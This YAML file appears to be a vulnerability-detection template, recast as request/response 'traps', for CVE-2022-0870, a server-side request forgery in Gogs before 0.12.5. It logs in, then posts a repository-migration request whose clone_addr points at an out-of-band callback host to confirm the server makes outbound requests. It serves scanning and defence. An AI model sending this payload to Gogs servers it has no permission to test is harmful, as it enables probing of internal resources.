id: CVE-2022-0870
info:
  name: Gogs <0.12.5 - Server-Side Request Forgery
  author: theamanrawat,Akincibor
  description: 'Gogs GitHub repository before 0.12.5 is susceptible to server-side
    request forgery. An attacker can possibly obtain sensitive information, modify
    data, and/or execute unauthorized administrative operations in the context of
    the affected site.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability can result in unauthorized
    access to sensitive internal resources.

    '
  remediation: Fixed in version 0.12.5.
  reference:
  - https://github.com/gogs/gogs/commit/91f2cde5e95f146bfe4765e837e7282df6c7cabb
  - https://huntr.dev/bounties/327797d7-ae41-498f-9bff-cc0bf98cf531
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0870
  - https://github.com/cokeBeer/go-cves
  - https://github.com/michaellrowley/michaellrowley
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2022-0870
    cwe-id: CWE-918
    epss-score: 0.00179
    epss-percentile: 0.54242
    cpe: cpe:2.3:a:gogs:gogs:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 4
    vendor: gogs
    product: gogs
  tags: cve,cve2022,ssrf,gogs,authenticated,huntr
traps:
- request:
    method: GET
    path: /user/login
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: content="Gogs
- request:
    method: POST
    path: /user/login
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: '_csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /repo/migrate
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /repo/migrate
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: '_csrf={{auth_csrf}}&clone_addr=https%3A%2F%2F{{interactsh-url}}&auth_username=&auth_password=&uid=1&repo_name={{randstr}}&description=test

      '
  response:
    status_code: 200
    headers: {}
    body: ''
